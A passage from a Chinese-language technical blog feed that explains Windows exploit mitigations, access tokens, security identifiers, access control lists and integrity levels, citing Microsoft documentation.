OFF</span><br><span class="line">    StrictControlFlowGuard             : OFF</span><br><span class="line"></span><br><span class="line">BinarySignature:</span><br><span class="line">    MicrosoftSignedOnly                : ON</span><br><span class="line">    AllowStoreSignedBinaries           : OFF</span><br><span class="line">    AuditMicrosoftSignedOnly           : OFF</span><br><span class="line">    AuditStoreSigned                   : OFF</span><br><span class="line"></span><br><span class="line">FontDisable:</span><br><span class="line">    DisableNonSystemFonts              : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ImageLoad:</span><br><span class="line">    BlockRemoteImageLoads              : ON</span><br><span class="line">    AuditRemoteImageLoads              : OFF</span><br><span class="line">    BlockLowLabelImageLoads            : ON</span><br><span class="line">    AuditLowLabelImageLoads            : OFF</span><br><span class="line">    PreferSystem32                     : OFF</span><br><span class="line">    AuditPreferSystem32                : OFF</span><br><span class="line"></span><br><span class="line">Payload:</span><br><span class="line">    EnableExportAddressFilter          : OFF</span><br><span class="line">    AuditEnableExportAddressFilter     : OFF</span><br><span class="line">    EnableExportAddressFilterPlus      : OFF</span><br><span class="line">    AuditEnableExportAddressFilterPlus : OFF</span><br><span class="line">    EnableImportAddressFilter          : OFF</span><br><span class="line">    AuditEnableImportAddressFilter     : OFF</span><br><span class="line">    EnableRopStackPivot                : OFF</span><br><span class="line">    AuditEnableRopStackPivot           : OFF</span><br><span class="line">    EnableRopCallerCheck               : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line">    EnableRopSimExec                   : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line"></span><br><span class="line">Child Process:</span><br><span class="line">    DisallowChildProcessCreation       : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">User Shadow Stack:</span><br><span class="line">    UserShadowStack                    : OFF</span><br><span class="line">    UserShadowStackStrictMode          : OFF</span><br><span class="line">    AuditUserShadowStack               : OFF</span><br><span class="line">    SetContextIpValidation             : OFF</span><br><span class="line">    AuditSetContextIpValidation        : OFF</span><br><span class="line">    BlockNonCetBinaries                : OFF</span><br><span class="line">    BlockNonCetBinariesNonEhcont       : OFF</span><br><span class="line">    AuditBlockNonCetBinaries           : OFF</span><br></pre></td></tr></table></figure><p>其功能介绍如下：</p><table><thead><tr><th align="left"><strong>Mitigation</strong></th><th align="left"><strong>Description</strong></th><th align="left"><strong>Default</strong></th><th align="left"><strong>Level</strong></th></tr></thead><tbody><tr><td align="left">Control flow guard (CFG)</td><td align="left">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Data Execution Prevention (DEP)</td><td align="left"><strong>数据执行保护</strong>，和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Force randomization for images (Mandatory ASLR)</td><td align="left">强制重定位未使用/DYNAMICBASE 编译的映像</td><td align="left">Off</td><td align="left">System &amp; app</td></tr><tr><td align="left">Randomize memory allocations (Bottom-Up ASLR)</td><td align="left">虚拟内存地址分配随机化</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate exception chains (SEHOP)</td><td align="left">在程序转入异常处理前，SEHOP会检查SEH链，特别是最后一个异常处理函数是否为系统固定的终极异常处理函数，确保其完整性</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate heap integrity</td><td align="left">当检测到堆损坏时，终止进程</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Arbitrary code guard (ACG)</td><td align="left">阻止未(经过微软)签名的模块加载，禁止创建未签名的可执行页，保护签名过的代码页使其不能被修改</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block low integrity images</td><td align="left">防止加载标记为低完整性的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block remote images</td><td align="left">防止从远程设备加载图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block untrusted fonts</td><td align="left">防止加载任何未安装在系统字体目录中的基于GDI的字体，特别是来自web的字体</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Code integrity guard</td><td align="left">限制加载Microsoft，WHQL或更高版本签名的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable extension points</td><td align="left">禁用允许将 DLL 注入所有进程的各种可扩展性机制</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable Win32k system calls</td><td align="left">防止应用程序使用Win32k系统调用表</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Don’t allow child processes</td><td align="left">防止应用程序创建子进程</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Export address filtering (EAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Import address filtering (IAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Simulate execution (SimExec)</td><td align="left">确保敏感 api 的调用返回给合法调用者</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate API invocation (CallerCheck)</td><td align="left">确保调用敏感API的调用者是合法的</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate handle usage</td><td align="left">无效句柄引用后引发异常</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate image dependency integrity</td><td align="left">强制对Windows映像依赖项加载执行代码签名</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate stack integrity (StackPivot)</td><td align="left">确保堆栈不会被重定向到敏感API</td><td align="left">N/a</td><td align="left">App</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows SID &amp; Integrity Level</title>
      <link href="posts/37e301d0/"/>
      <url>posts/37e301d0/</url>
      
        <content type="html"><![CDATA[<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Access-Tokens"><a href="#Access-Tokens" class="headerlink" title="Access Tokens"></a>Access Tokens</h2><p>访问令牌是一个描述进程或线程上下文安全的对象，令牌中的信息包括与进程或线程相关联的用户的 id 信息和权限。当用户登录时，系统会把用户输入的密码和存储在安全数据库中的信息进行比对，来验证用户的密码。如果密码被认证，系统会产生访问令牌。 此用户执行的每个进程都同样有该访问令牌(a copy of user’s access token)。</p><p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包含以下信息：</p><ul><li>用户帐户的安全标识符（SID）</li><li>用户所属组的SID</li><li>标识当前登录会话的登录 SID</li><li>用户或用户组所拥有的特权列表</li><li>所有者 SID。An owner SID</li><li>The SID for the primary group</li><li>当用户在不指定<strong>安全描述符</strong>的情况下创建安全对象时，系统默认使用 DACL</li><li>访问令牌的来源</li><li>Whether the token is a primary or impersonation token</li><li>限制SID的可选列表</li><li>Current impersonation levels</li><li>Other statistics</li></ul><p>每个进程都有一个<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly">主令牌</a>，用于描述与该进程关联的用户的<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">安全上下文</a>。默认情况下，当进程的线程与安全对象交互时，系统使用主令牌。此外，线程可以模拟 client account。模拟后，允许线程使用客户端的安全上下文与安全对象交互。模拟客户端的线程同时具有主令牌和<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/i-gly"><em>模拟令牌</em></a>。</p><h2 id="primary-token"><a href="#primary-token" class="headerlink" title="primary token"></a>primary token</h2><p>主要令牌：通常仅由 Windows 内核创建的访问令牌。它可以分配给一个进程来表示该进程的默认安全信息。</p><h2 id="impersonation-token"><a href="#impersonation-token" class="headerlink" title="impersonation token"></a>impersonation token</h2><p>模拟令牌：为捕获客户端进程的安全信息而创建的访问令牌，允许服务器在安全操作中“模拟”客户端进程。</p><h2 id="Restricted-Tokens"><a href="#Restricted-Tokens" class="headerlink" title="Restricted Tokens"></a>Restricted Tokens</h2><p>受限令牌：受限令牌是主访问令牌或模拟访问令牌调用 <a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken"><strong>CreateRestrictedToken</strong></a>方法修改而来。处于受限令牌的安全上下文运行的进程或模拟线程访问安全对象或执行特权操作的能力受到限制，CreatereestrictToken函数可以通过以下方式限制令牌：</p><ul><li>从令牌中删除权限</li><li>将 deny-only 属性应用于令牌中的 sid，以便它们不能用于访问安全对象</li><li>指定限制 SID 的列表，该列表限制对安全对象的访问。</li></ul><p>系统使用限制 SID 列表来检查令牌对安全对象的访问，当受限进程或线程尝试访问安全对象时，系统将执行两个访问检查：一个是使用令牌已启用的 SID，另一个使用受限SID列表。只有这两个访问检查都被通过的时候，才会授予访问者访问权限。</p><h2 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h2><p>包含安全对象的安全信息的结构和关联数据。安全描述符标识对象的所有者和主要组。它还可以包含控制对对象的访问的 DACL 和控制对访问对象的尝试的日志记录的 SACL。</p><h1 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li>在<a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft </a><a href="https://en.wikipedia.org/wiki/Windows_NT">Windows NT</a>系列<a href="https://en.wikipedia.org/wiki/Operating_system">操作系统</a>的上下文中，<strong>安全标识符</strong>（通常缩写为<strong>SID</strong>）是用户、用户组或其他<a href="https://en.wikipedia.org/wiki/Security_principal">安全主体</a>的唯一的、<a href="https://en.wikipedia.org/wiki/Immutable_object">不可变的</a>标识符。SID在 Windows 中首次创建账户时被创建，一个安全主体（在给定域中）终生有一个 SID，主体的所有属性，包括其名称，都与 SID 相关联。</li><li>SID（安全标识符）是计算机或域控制器用来识别你的唯一ID号，它是分配给 Windows 计算机上的每个用户或域控制网络上的每个用户、组和计算机的一串字母数字字符。</li><li>当我们输入用户名和密码时，Windows 首先会检查我们输入的用户名和其相对应的存储密码是否匹配，之后它会在 Windows注册表中查看与该用户名关联的 SID。用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，会重新获取访问令牌。</li><li>Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。</li></ul><h2 id="SID-解析"><a href="#SID-解析" class="headerlink" title="SID 解析"></a>SID 解析</h2><p>SID 如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; WMIC useraccount get name,sid</span><br><span class="line">Name                SID</span><br><span class="line">Administrator       S-1-5-21-3018282723-2406670630-2225774231-500</span><br><span class="line">air                 S-1-5-21-3018282723-2406670630-2225774231-1000</span><br><span class="line">DefaultAccount      S-1-5-21-3018282723-2406670630-2225774231-503</span><br><span class="line">Guest               S-1-5-21-3018282723-2406670630-2225774231-501</span><br><span class="line">WDAGUtilityAccount  S-1-5-21-3018282723-2406670630-2225774231-504</span><br></pre></td></tr></table></figure><p>微软通常将其分解为以下模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SID)-(revision level)-(identifier-authority)-(subauthority)-(etc)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">S</th><th align="center">1</th><th align="center">5</th><th align="center">21-3018282723-2406670630-2225774231</th><th align="center">1000</th></tr></thead><tbody><tr><td align="center">标识为SID</td><td align="center">一直都是 1</td><td align="center">权限值</td><td align="center">子权限值 在这种情况下，域 (21) 具有唯一标识符。可能有多个下级机构，特别是如果该帐户存在于域中并且属于不同的群体</td><td align="center">相对 ID。默认情况下未创建的任何组或用户将具有 1000 或更大的相对 ID。</td></tr></tbody></table><ul><li><p><strong>SID</strong>: 一直都是 S，这个是 SID 的标识符</p></li><li><p><strong>Revision level</strong>: 一直都是 1</p></li><li><p><strong>Identifier-authority</strong>: 用于标识创建 SID 的权限</p><p>  可能的值为：</p><ul><li>0 ( <code>SECURITY_NULL_SID_AUTHORITY</code>) 是<em>空帐户 SID</em> 的所有者<code>S-1-0-0</code>。</li><li>1（ <code>SECURITY_WORLD_SID_AUTHORITY</code>， <em>everyone group</em>）也仅具有一个SID： <code>S-1-1-0</code>。</li><li>2 ( <code>SECURITY_LOCAL_SID_AUTHORITY</code>, <em>local group</em> ) 也只有一个 SID: <code>S-1-2-0</code>.</li><li>3 ( <code>SECURITY_CREATOR_SID_AUTHORITY</code>)：SID<code>S-1-3-0</code>到<code>S-1-3-5</code>)</li><li>4 ( <code>SECURITY_NON_UNIQUE_AUTHORITY</code>) 未使用</li><li>5 ( <code>SECURITY_NT_AUTHORITY</code>) 拥有由 NT 安全子系统管理的<a href="https://renenyffenegger.ch/notes/Windows/user-account/index">帐户</a>。</li><li>9 ( <code>SECURITY_RESOURCE_MANAGER_AUTHORITY</code>) …</li><li>16 ( <code>SECURITY_MANDATORY_LABEL_AUTHORITY</code>)，见<a href="https://renenyffenegger.ch/notes/Windows/development/process/index#win-process-integrity-level">流程完整性等级</a></li></ul></li><li><p>Subauthority：这是一个变量号，用于标识SID所描述的用户或组与创建它的机构之间的关系</p><ul><li>号码由那个计算机或网络所创建</li><li>此用户是普通用户、访客、管理员还是其他组的一部分</li><li>该权限创建用户帐户的顺序 (i.e., “This was the first user” or “This is the 231st machine account created”.)</li></ul></li></ul><h2 id="已知-SID"><a href="#已知-SID" class="headerlink" title="已知 SID"></a>已知 SID</h2><p>每个用户的 SID 在所有 Windows 中都是唯一的。也就是说，某些 SID 在所有系统上都是通用的，或者以相同的前缀开头。</p><p>参看<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><p><strong>Capability SIDs</strong></p><p>Windows 8 引入了<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers#capability-sids">功能安全标识符 (SID)</a>。Capability SIDs 以唯一且不可变的方式标识能力。Capability SIDs 代表了一种令人难忘的权限令牌，它授予通用 Windows 应用程序对资源（例如文档、相机、位置等）的访问权限。具有该 SID 的应用被授予对关联资源的访问权限，反之没有该 SID的应用程序将被拒绝访问资源。</p><p>操作系统所知的所有功能SID都存储在以下子项中的Windows注册表中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SecurityManager\CapabilityClasses\AllCachedCapabilities</span><br></pre></td></tr></table></figure><p>此子项还包含由第一方或第三方应用程序添加的任何功能 SID。所有功能 SID 都以<code>S-1-15-3</code>.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kb.iu.edu/d/aotl">https://kb.iu.edu/d/aotl</a></p><p><a href="https://en.wikipedia.org/wiki/Security_Identifier">https://en.wikipedia.org/wiki/Security_Identifier</a></p><p><a href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a></p><p><a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows">https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/security-identifiers-in-windows</a></p><h1 id="Integrity-Level"><a href="#Integrity-Level" class="headerlink" title="Integrity Level"></a>Integrity Level</h1><h2 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>完整性级别表示正在运行的应用程序进程和对象（例如应用程序创建的文件）的可信度，由一组特殊的 SID 和 ACL 条目实现的，它们代表五个不断增加的特权级别：untrusted, low, medium, high, system</p></li><li><p>如果一个对象处于比请求者更高级的信用等级，访问该对象就会受限。</p></li><li><p>Integrity 级别还实现了用户界面权限隔离，Integrity 性级别的规则应用于在同一桌面下的不同进程之间交换窗口消息</p></li><li><p>token 可以向更高 level 的 object 读数据，但是不能写数据。</p></li><li><p>大多数桌面应用程序以 medium integrity (MI)信任等级运行，信任度较低的程序(保护模式下的 IE 和 GPU 的 Sandbox)以 low integrity (LI) 信任等级运行，而 renderer 则以最低的信任等级运行。</p></li><li><p>Windows 完整性机制的目的是限制同一账户下运行的可信度较低的应用程序的访问权限。主要解决的安全问题是未授权篡改用户数据，间接篡改系统状态，信息泄露。</p></li></ul><blockquote><p>Windows 安全体系结构主要基于 SID 来构建，SID 代表着每个用户或组所被授予的访问权限（读、写和执行权限）和特权。当用户登录 Windows 时，安全子系统会在<code>security access token</code>中添加用户的 SID 和组成员身份 SID，相应的该用户或组下的所有应用程序会被授予同样的访问权限和特权。每次应用程序打开一个<strong>对象</strong>（如文件或注册表项）时，管理该对象的资源管理器都会访问安全子系统来确定此用户是否具有访问权限，安全子系统会把<code>access token</code>中的用户和组的 SID 和与<strong>对象</strong>相关联的 SID 进行比较，如果用户SID在对象的ACL中授予完全访问权限，则用户运行的应用程序进程可以完全访问该对象。</p></blockquote><h2 id="Extending"><a href="#Extending" class="headerlink" title="Extending"></a>Extending</h2><ul><li>Windows 完整性机制通过定义新的访问控制条目（ACE）类型来扩展安全体系结构，新的 ACE (access control entry) 用来代表对象安全描述符中的完整性级别。当访问令牌被初始化时，完整性级别也被分配给安全访问令牌。</li><li>访问令牌中的完整性级别表示 <code>subject</code> 的完整性级别，使用安全描述符中强制标签 ACE 中的完整性级别 SID 来表示对象完整性级别。当安全子系统（安全参考监视器）执行访问检查时，将 <strong>access token</strong> (访问令牌)中的完整性级别 与 <strong>SID</strong> (安全标识符) 中的完整性水平进行比较。</li><li>Windows 根据 Subject 的完整性级别和新访问控制ACE中的完整性策略标志来判断其访问权限。</li><li>安全子系统将完整性级别实现为强制标签，目的是区分 ACLs所提供给用户的自由控制的<code>discretionary access</code></li><li>强制标签 ACE定义了一个 Object 的完整性级别，但是并不改变现有的安全描述符数的据结构定义和常用的自由访问控制表(discretionary access control list，缩写为DACL)，该表通常授予管理员和系统完全控制权限，并授予通过身份验证用户读取和执行权限。</li></ul><blockquote><p>Windows Vista 使用<strong>AccessCheck</strong>函数来确定安全对象具有哪些访问权限</p></blockquote><h3 id="Access-Control-Entries-ACE"><a href="#Access-Control-Entries-ACE" class="headerlink" title="Access Control Entries(ACE)"></a>Access Control Entries(ACE)</h3><p>ACE 是 ACL 列表当中的一个成员。一个 ACL 中可以有 0 个或多个 ACE。每个ACE控制或监视指定受信者的对象的访问权限。一共有 6 种 ACE，其中 3 种支持所有的安全对象，其他三种类型是目录服务对象支持的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/object-specific-aces">Object-specific ACEs</a>。</p><p>所有类型的ACE都包含以下访问控制信息：</p><ul><li>安全标识符（SID），用于标识 ACE 应用的 trustee。</li><li>由ACE控制的访问权限的访问掩码。</li><li>表示ACE类型的标志。</li><li>一组位标志，用于确定子容器或对象是否可以从ACL附加到的主对象继承ACE。</li></ul><p>以下是所有安全对象支持的三种 ACE 类型：</p><table><thead><tr><th align="left">Type</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">Access-denied ACE</td><td align="left">在<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly"><em>discretionary access control list</em></a> （DACL）中用于拒绝对 trustee 的访问权限。</td></tr><tr><td align="left">Access-allowed ACE</td><td align="left">在DACL中用于允许对 trustee 的访问权限。</td></tr><tr><td align="left">System-audit ACE</td><td align="left">Used in a <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>system access control list</em></a> (SACL) to generate an audit record when the trustee attempts to exercise the specified access rights.</td></tr></tbody></table><h3 id="Access-Control-Lists-ACL"><a href="#Access-Control-Lists-ACL" class="headerlink" title="Access Control Lists(ACL)"></a>Access Control Lists(ACL)</h3><p>ACL 是 ACE 的一个列表。ACL 中的每个 ACE 都标识一个 trustee，ACE 代表着 trustee 的允许、拒绝或审核的权限。安全对象的安全描述符可以包含两种类型的 ACL 分别是 DACL 和 SACL：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/d-gly">discretionary access control list</a> (DACL) 标识允许或拒绝访问安全对象的受信者(trustee)。当一个进程试图访问一个安全对象时，系统会检查该对象的 DACL 中的 ACE，以确定是否授予对它的访问权。如果该对象没有DACL，系统将授予所有人完全访问权限。如果对象的 DACL 内没有 ACE，系统将拒绝所有进程访问该对象。操作系统按顺序检查 ACE，直到满足以下事件的其中一个：</p><ul><li>access-denied ACE 明确拒绝了线程访问令牌中的某一个 trustee 的所有访问请求</li><li>线程的访问令牌中列出的 trustee 的一个或多个 access-allowed ACEs 显式授予所有请求的访问权限</li><li>已检查所有ACE，但仍至少有一个请求的访问权限未被显式允许，在这种情况下，访问将被隐式拒绝。</li></ul><p>下图显示了对象的DACL如何允许访问一个线程，同时拒绝访问另一个线程：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://docs.microsoft.com/en-us/windows/win32/secauthz/images/accctrl1.png"></p><p>线程 A 请求访问 Object，系统按顺序检查 DACL，发现第一个 ACE 明确拒绝了 Andrew 的访问，而 Andrew 在线程 A 的访问令牌中，所以线程 A 被拒绝。<strong>当请求的访问被明确授予或拒绝时，系统会停止检查 ACE，所以 DACL 中 ACE 的顺序很重要。</strong></p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">system access control list</a> (SACL) 使管理员能够记录访问安全对象的尝试。每个 ACE 都明确了由指定的受信者(trustee)进行的尝试访问类型，操作系统会在安全事件日志记录下这一行为(无论访问尝试成功、失败或者二者同时发生都会生成记录)。</p><p>ACL 还为 Microsoft Active Directory 目录服务对象提供访问控制，</p><h2 id="完整性机制的设计"><a href="#完整性机制的设计" class="headerlink" title="完整性机制的设计"></a>完整性机制的设计</h2><p>Windows完整性机制是Windows安全体系结构的扩展，它基于内核中的安全引用监视器(the Security Reference Monitor)。安全引用监视器通过将安全访问令牌中的用户和组 SID 与对象安全描述符的ACL中授予的访问权限进行对比，来判断其是否具有访问权限。完整性机制为安全访问令牌和安全描述符中的System ACL（SACL）添加了完整性级别和强制标签访问控制条目。</p><h3 id="Integrity-levels"><a href="#Integrity-levels" class="headerlink" title="Integrity levels"></a>Integrity levels</h3><p>Windows 使用 SID 定义完整性级别。完整性级别 SID 具有以下形式：S-1-16-xxxx。表 1 显示了完整性级别 SID 的组成部分。</p><p><strong>Table 1  Integrity level SID identifier authority values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16</td><td align="left">表示强制标签授权 (SECURITY_MANDATORY_LABEL_AUTHORITY).</td></tr><tr><td align="left">xxxx</td><td align="left">表示作为完整性级别的相对标识符（RID）字段。RID是表示完整性级别的十六进制值。</td></tr></tbody></table><p>Windows Vista中有四个主要完整性级别，具有四个相应的值，表 2 显示了定义的完整性级别及其相应的值。</p><p><strong>Table 2  Defined integrity levels and corresponding values</strong></p><table><thead><tr><th align="left">Value</th><th align="left">Description</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">0x0000</td><td align="left">Untrusted level</td><td align="left">SECURITY_MANDATORY_UNTRUSTED_RID</td></tr><tr><td align="left">0x1000</td><td align="left">Low integrity level</td><td align="left">SECURITY_MANDATORY_LOW_RID</td></tr><tr><td align="left">0x2000</td><td align="left">Medium integrity level</td><td align="left">SECURITY_MANDATORY_MEDIUM_RID</td></tr><tr><td align="left">0x3000</td><td align="left">High integrity level</td><td align="left">SECURITY_MANDATORY_HIGH_RID</td></tr><tr><td align="left">0x4000</td><td align="left">System integrity level</td><td align="left">SECURITY_MANDATORY_SYSTEM_RID</td></tr></tbody></table><p>例如：S-1-16-8192。 RID值为8192，16 进制为0x2000，代表其具有中完整性级别</p><p>定义完整性级别的 SID 具有与其关联的字符串名称。通过调用 API <code>LookupAccountSID</code> 可以返回每个完整性级别 SID 的字符串名称。表3显示了完整性级别的字符串名称。</p><p><strong>Table 3  Integrity level string names</strong></p><table><thead><tr><th align="left">Integrity level SID</th><th align="left">Name</th></tr></thead><tbody><tr><td align="left">S-1-16-4096</td><td align="left">Mandatory Label\Low Mandatory Level</td></tr><tr><td align="left">S-1-16-8192</td><td align="left">Mandatory Label\Medium Mandatory Level</td></tr><tr><td align="left">S-1-16-12288</td><td align="left">Mandatory Label\High Mandatory Level</td></tr><tr><td align="left">S-1-16-16384</td><td align="left">Mandatory Label\System Mandatory Level</td></tr></tbody></table><h2 id="Integrity-levels-and-UAC"><a href="#Integrity-levels-and-UAC" class="headerlink" title="Integrity levels and UAC"></a>Integrity levels and UAC</h2><ul><li><p>当管理员处于Approval 模式时，Windows Vista 中的 UAC 在同一桌面上以不同的访问级别运行多个程序。每个程序在创建进程的时候内核会分配一个安全访问令牌，基于此令牌每个程序具有不同的权限。</p></li><li><p>标准帐户的用户在登录期间会被分配一个<strong>中等完整性级别</strong>安全访问令牌，相应的这个令牌也会分配给该用户下的几乎所有应用程序。</p></li><li><p>帐户为Administrators组成员的用户在登录时有两个链接在一起的安全访问令牌。一个是标准用户中等完整性级别的访问令牌，其中Administrators组仅用于拒绝访问检查，并且删除了某些管理权限。第二个访问令牌是一个拥有完整特权、高访问权限的令牌，其被分配为高完整性级别，所以该令牌拥有管理员组和管理权限。两个访问令牌都具有相同的用户 SID 和来自 Active Directory 的相同全局组（域和企业管理的筛选组除外）。</p></li><li><p>Windows 资源管理器(Shell)所有非管理员任务都被分配为标准用户和中等完整性的访问令牌，对于作为Administrators组成员的用户，几乎所有应用程序都会使用中间完整性访问令牌运行。</p></li><li><p>完整性机制对于中等完整性级别的应用程序是透明的，除非他们可能会控制更高权限级别上运行的其他进程。例如：Windows UI 自动化是旨在控制其他进程的应用程序的一个示例。</p></li></ul><p>低完整性进程只有通用的执行访问权限。通用的执行访问权限包括以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYNCHRONIZE, PROCESS_QUERY_LIMITED_INFORMATION</span><br><span class="line">PROCESS_TERMINATE</span><br></pre></td></tr></table></figure><p>一般的，低完整性进程对更高完整性进程的读取访问受到限制（PROCESS_VM_READ access to the virtual memory of a process, and PROCESS_QUERY_INFORMATION），这些内存可能包含用于身份验证的密码数据或其他密钥资料。对较高完整性进程的通用写访问被No_Write_up策略阻止。 通用写入过程访问权限包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PROCESS_CREATE_THREAD</span><br><span class="line">PROCESS_VM_OPERATION</span><br><span class="line">PROCESS_VM_WRITE</span><br><span class="line">PROCESS_DUP_HANDLE</span><br><span class="line">PROCESS_SET_QUOTA</span><br><span class="line">PROCESS_SET_INFORMATION</span><br><span class="line">PROCESS_SET_PORT</span><br></pre></td></tr></table></figure><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625962(v=msdn.10)</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object">https://docs.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium Sandbox on Windows</title>
      <link href="posts/c0b7683f/"/>
      <url>posts/c0b7683f/</url>
      
